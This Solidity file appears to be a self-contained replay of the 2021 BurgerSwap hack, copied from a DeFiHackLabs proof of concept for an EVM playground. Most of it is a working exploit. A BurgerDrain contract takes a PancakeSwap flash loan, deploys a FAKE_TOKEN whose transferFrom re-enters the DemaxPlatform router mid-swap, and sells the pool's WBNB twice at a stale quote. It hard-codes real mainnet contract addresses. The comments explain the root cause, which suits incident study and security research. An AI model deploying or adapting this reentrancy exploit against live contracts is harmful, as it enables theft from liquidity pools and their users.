// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2021-05-BurgerSwap).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `Exploit is Test`
// contract: testExploit() triggers a PancakeSwap flash swap, and the
// `pancakeCall` callback + the re-entrancy `enter()` + the `FAKE_TOKEN` all live
// on the test contract itself. There is therefore no standalone contract to
// deploy. This contract is a faithful, self-contained copy of that inline
// attack (testExploit body → run(); pancakeCall; enter(); FAKE_TOKEN copied
// verbatim) so the playground can deploy it and record run(). Logic and
// constants are copied verbatim from test/BurgerSwap_exp.sol.
//
// Root cause: DemaxPlatform (the BurgerSwap router) freezes the multi-hop output
// amounts[] up-front from the current reserves, then walks the path hop-by-hop
// in _swap(). Each hop pulls the input token from the user via
// _innerTransferFrom → TransferHelper.safeTransferFrom, which calls the INPUT
// TOKEN's own transferFrom(). Because anyone can register a token + create a
// Demax pair, the attacker deploys a FAKE token whose transferFrom RE-ENTERS
// the router mid-swap (FAKE→BURGER→WBNB): the nested swap drains the live
// WBNB at the correct price, and when control returns the cached hop sells the
// SAME BURGER for WBNB again at the STALE pre-reentrancy quote. The pool's WBNB
// reserve is sold twice. No re-entrancy guard exists anywhere on the swap path.

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IDemaxPlatform {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] memory path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IDemaxDelegate {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
}

contract BurgerDrain {
    IERC20 internal constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 internal constant BURGER = IERC20(0xAe9269f27437f0fcBC232d39Ec814844a51d6b8f);

    IUniswapV2Pair internal constant USDT_WBNB =
        IUniswapV2Pair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);

    IDemaxPlatform internal constant demaxPlatform =
        IDemaxPlatform(0xBf6527834dBB89cdC97A79FCD62E6c08B19F8ec0); // router
    IDemaxDelegate internal constant demaxDelegate =
        IDemaxDelegate(0xd0dd735851C1Ca61d0324291cCD3959d2153A88d); // factory

    // Exact flash-borrow size from the original PoC (6,047.13 WBNB).
    uint256 internal constant FLASH_WBNB = 6_047_132_230_250_298_663_393;

    FAKE_TOKEN internal FAKE;

    function run() external {
        // Mirror testExploit(): borrow WBNB (token1 of the USDT/WBNB pair) via a
        // PancakeSwap flash swap. pancakeCall() does the whole attack and repays.
        USDT_WBNB.swap(0, FLASH_WBNB, address(this), "Flashloan 6047 WBNB");
    }

    function pancakeCall(address, uint256, uint256 amount1, bytes memory) public {
        // swap 6047 WBNB for ~92677 BURGER (pump BURGER price)
        WBNB.approve(address(demaxPlatform), type(uint256).max);
        BURGER.approve(address(demaxPlatform), type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(BURGER);
        demaxPlatform.swapExactTokensForTokens(
            WBNB.balanceOf(address(this)), 0, path, address(this), type(uint256).max
        );

        // create FAKE token, create FAKE<>BURGER pair and add 100 FAKE <> 45452 BURGER
        // liquidity (addLiquidity() creates the pair if it doesn't exist).
        FAKE = new FAKE_TOKEN(address(this));

        FAKE.approve(address(demaxPlatform), type(uint256).max);
        BURGER.approve(address(demaxDelegate), type(uint256).max);
        demaxDelegate.addLiquidity(
            address(FAKE), address(BURGER), 100, 45_452 ether, 0, 0, type(uint256).max
        ); // 47225 BURGER left after addLiquidity()

        FAKE.enableExploit();

        // Malicious path: 1 FAKE -> 45452 BURGER -> 4478 WBNB. The FAKE.transferFrom
        // hook re-enters enter() before the cached BURGER->WBNB hop runs, draining the
        // pool's WBNB a first time at the live price; the cached hop then drains it a
        // SECOND time at the stale pre-reentrancy quote.
        address[] memory path2 = new address[](3);
        path2[0] = address(FAKE);
        path2[1] = address(BURGER);
        path2[2] = address(WBNB);
        demaxPlatform.swapExactTokensForTokens(1 ether, 0, path2, address(this), type(uint256).max);

        // swap ~494 WBNB for 108k BURGER (cheap BURGER, pool is BURGER-heavy) to repay.
        path[0] = address(WBNB);
        path[1] = address(BURGER);
        demaxPlatform.swapTokensForExactTokens(108_791 ether, 494 ether, path, address(this), type(uint256).max);

        // repay 0.3% fee
        WBNB.transfer(address(USDT_WBNB), amount1 * 1000 / 997);
    }

    function enter() public {
        // Nested, correctly-priced swap: another 45452 BURGER for ~4478 WBNB. This
        // inner BURGER -> WBNB swap uses the correct (live) reserves and is not locked.
        address[] memory path = new address[](2);
        path[0] = address(BURGER);
        path[1] = address(WBNB);
        demaxPlatform.swapExactTokensForTokens(45_452 ether, 0, path, address(this), type(uint256).max);

        FAKE.disableExploit();
    }
}

contract FAKE_TOKEN {
    uint256 public totalSupply = 100 ether;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    BurgerDrain private immutable exploit;
    bool private isExploiting;

    constructor(address main) {
        balanceOf[main] = 99 ether;
        exploit = BurgerDrain(main);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        unchecked {
            allowance[sender][msg.sender] -= amount;
            balanceOf[sender] -= amount;
            balanceOf[recipient] += amount;
        }

        if (isExploiting) {
            exploit.enter();
        }
        return true;
    }

    function enableExploit() public {
        isExploiting = true;
    }

    function disableExploit() public {
        isExploiting = false;
    }

    function transfer(address, uint256) external pure returns (bool) {
        return true;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }
}
